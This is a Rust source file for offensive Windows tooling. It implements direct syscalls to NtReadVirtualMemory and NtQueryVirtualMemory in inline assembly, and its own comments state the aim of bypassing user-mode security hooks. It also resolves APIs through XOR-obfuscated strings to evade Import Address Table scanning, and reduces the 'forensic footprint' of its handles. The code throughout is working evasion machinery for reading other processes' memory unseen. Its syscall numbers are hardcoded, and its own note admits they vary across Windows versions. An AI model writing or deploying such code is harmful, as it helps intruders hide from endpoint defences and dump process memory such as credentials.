//! syscaller.rs — Direct Syscall engine and Dynamic API resolution for evasion.
//! (Red Audit Remediation - L0/L1)

use std::arch::asm;
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};
use crate::obfuscate;
use crate::xor_str;

/// Custom handle wrapper for RAII-based closure (Forensic footprint reduction)
pub struct SafeHandle(pub HANDLE);

impl Drop for SafeHandle {
    fn drop(&mut self) {
        if self.0 != 0 && self.0 != -1 {
            unsafe {
                // Dynamic resolution for CloseHandle (Obfuscated with Polymorphic Key)
                const K32: [u8; 12] = xor_str!("kernel32.dll", obfuscate::POLY_XOR_KEY);
                const CH: [u8; 11] = xor_str!("CloseHandle", obfuscate::POLY_XOR_KEY);
                
                let close_handle = Resolve::api::<unsafe extern "system" fn(HANDLE) -> i32>(
                    &obfuscate::decrypt(&K32, obfuscate::POLY_XOR_KEY), 
                    &obfuscate::decrypt(&CH, obfuscate::POLY_XOR_KEY)
                );
                if let Some(f) = close_handle {
                    f(self.0);
                }
            }
        }
    }
}

/// Direct Syscall numbers for x64 Windows (Windows 10/11 common offsets)
/// NOTE: These can change between versions. Ideally, we should parse ntdll for these.
const SYSCALL_READ_VIRTUAL_MEMORY: u32 = 0x3F; // NtReadVirtualMemory
const SYSCALL_QUERY_VIRTUAL_MEMORY: u32 = 0x23; // NtQueryVirtualMemory

/// Direct Syscall: NtReadVirtualMemory
/// Bypasses user-mode hooks in kernel32.dll/ntdll.dll.
pub unsafe fn nt_read_virtual_memory(
    process_handle: HANDLE,
    base_address: *const std::ffi::c_void,
    buffer: *mut std::ffi::c_void,
    buffer_size: usize,
    number_of_bytes_read: *mut usize,
) -> NTSTATUS {
    let mut status: i32;
    asm!(
        "sub rsp, 40",
        "mov qword ptr [rsp + 32], {0}",
        "mov r10, {1}",
        "mov rdx, {2}",
        "mov r8, {3}",
        "mov r9, {4}",
        "syscall",
        "add rsp, 40",
        in(reg) number_of_bytes_read,
        in(reg) process_handle,
        in(reg) base_address,
        in(reg) buffer,
        in(reg) buffer_size,
        in("rax") SYSCALL_READ_VIRTUAL_MEMORY as u64,
        out("rcx") _, 
        out("r11") _,
        out("rdx") _,
        out("r8") _,
        out("r9") _,
        out("r10") _,
        lateout("rax") status,
    );
    status
}

/// Direct Syscall: NtQueryVirtualMemory
pub unsafe fn nt_query_virtual_memory(
    process_handle: HANDLE,
    base_address: *const std::ffi::c_void,
    memory_information_class: i32,
    memory_information: *mut std::ffi::c_void,
    memory_information_length: usize,
    return_length: *mut usize,
) -> NTSTATUS {
    let mut status: i32;
    asm!(
        "sub rsp, 56",             // Shadow space (32) + stack args (16) + alignment (8)
        "mov qword ptr [rsp + 32], {0}",
        "mov qword ptr [rsp + 40], {1}",
        "mov r10, {2}",
        "mov rdx, {3}",
        "mov r8, {4}",
        "mov r9, {5}",
        "syscall",
        "add rsp, 56",
        in(reg) memory_information_length,
        in(reg) return_length,
        in(reg) process_handle,
        in(reg) base_address,
        in(reg) memory_information_class,
        in(reg) memory_information,
        in("rax") SYSCALL_QUERY_VIRTUAL_MEMORY as u64,
        out("rcx") _,
        out("r11") _,
        out("rdx") _,
        out("r8") _,
        out("r9") _,
        out("r10") _,
        lateout("rax") status,
    );
    status
}

/// Dynamic API Resolution to bypass IAT (Import Address Table) scanning.
pub struct Resolve;

impl Resolve {
    /// Resolves a procedure address without static linking.
    pub unsafe fn api<T>(module: &str, function: &str) -> Option<T> {
        use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
        
        let mod_cstr = std::ffi::CString::new(module).ok()?;
        let func_cstr = std::ffi::CString::new(function).ok()?;
        
        let h_mod = GetModuleHandleA(mod_cstr.as_ptr() as *const u8);
        if h_mod == 0 { return None; }
        
        let addr = GetProcAddress(h_mod, func_cstr.as_ptr() as *const u8);
        addr.map(|f| std::mem::transmute_copy(&f))
    }
}
